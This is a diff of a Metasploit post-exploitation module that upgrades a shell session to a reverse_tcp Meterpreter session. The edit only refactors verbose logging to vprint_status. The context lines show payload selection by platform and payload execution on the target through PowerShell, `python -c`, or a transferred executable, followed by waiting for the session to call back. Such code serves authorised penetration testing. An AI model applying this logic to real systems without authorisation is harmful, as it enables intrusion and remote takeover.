@@ -78,15 +78,15 @@ class Metasploit3 < Msf::Post
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
       psh_arch = 'x86'
-      print_status("Platform: Windows") if datastore['VERBOSE']
+      vprint_status("Platform: Windows")
     when /osx/i
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
-      print_status("Platform: OS X") if datastore['VERBOSE']
+      vprint_status("Platform: OS X")
     when /solaris/i
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
-      print_status("Platform: Solaris") if datastore['VERBOSE']
+      vprint_status("Platform: Solaris")
     else
       # Find the best fit, be specific with uname to avoid matching hostname or something else
       target_info = cmd_exec('uname -mo')
@@ -96,16 +96,16 @@ class Metasploit3 < Msf::Post
         payload_name = 'linux/x86/meterpreter/reverse_tcp'
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
-        print_status("Platform: Linux") if datastore['VERBOSE']
+        vprint_status("Platform: Linux")
       elsif cmd_exec('python -V') =~ /Python (2|3)\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
-        print_status("Platform: Python [fallback]") if datastore['VERBOSE']
+        vprint_status("Platform: Python [fallback]")
       end
     end
     payload_name = datastore['PAYLOAD_OVERWRITE'] if datastore['PAYLOAD_OVERWRITE']
-    print_status("Upgrade payload: #{payload_name}") if datastore['VERBOSE']
+    vprint_status("Upgrade payload: #{payload_name}")
 
     if platform.blank?
       print_error("Shells on the the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
@@ -129,26 +129,26 @@ class Metasploit3 < Msf::Post
     case platform
     when 'win'
       if (have_powershell?) && (datastore['WIN_TRANSFER'] != 'VBS')
-        print_status("Transfer method: Powershell") if datastore['VERBOSE']
+        vprint_status("Transfer method: Powershell")
         psh_opts = { :prepend_sleep => 1, :encode_inner_payload => true, :persist => false }
         cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
       else
         print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
-        print_status("Transfer method: VBS [fallback]") if datastore['VERBOSE']
+        vprint_status("Transfer method: VBS [fallback]")
         exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
         aborted = transmit_payload(exe)
       end
     when 'python'
-      print_status("Transfer method: Python") if datastore['VERBOSE']
+      vprint_status("Transfer method: Python")
       cmd_exec("python -c \"#{payload_data}\"")
     else
-      print_status("Transfer method: Bourne shell [fallback]") if datastore['VERBOSE']
+      vprint_status("Transfer method: Bourne shell [fallback]")
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
       aborted = transmit_payload(exe)
     end
 
     if datastore['HANDLER']
-      print_status("Cleaning up handler") if datastore['VERBOSE']
+      vprint_status("Cleaning up handler")
       cleanup_handler(listener_job_id, aborted)
     end
     return nil
@@ -188,7 +188,7 @@ class Metasploit3 < Msf::Post
     total_bytes = 0
     cmds.each { |cmd| total_bytes += cmd.length }
 
-    print_status("Starting transfer...") if datastore['VERBOSE']
+    vprint_status("Starting transfer...")
     begin
       #
       # Run the commands one at a time
@@ -230,7 +230,7 @@ class Metasploit3 < Msf::Post
     framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) {
       if !aborted
         timer = 0
-        print_status("Waiting up to #{HANDLE_TIMEOUT} seconds for the session to come back") if datastore['VERBOSE']
+        vprint_status("Waiting up to #{HANDLE_TIMEOUT} seconds for the session to come back")
         while !framework.jobs[listener_job_id].nil? && timer < HANDLE_TIMEOUT
           sleep(1)
           timer += 1
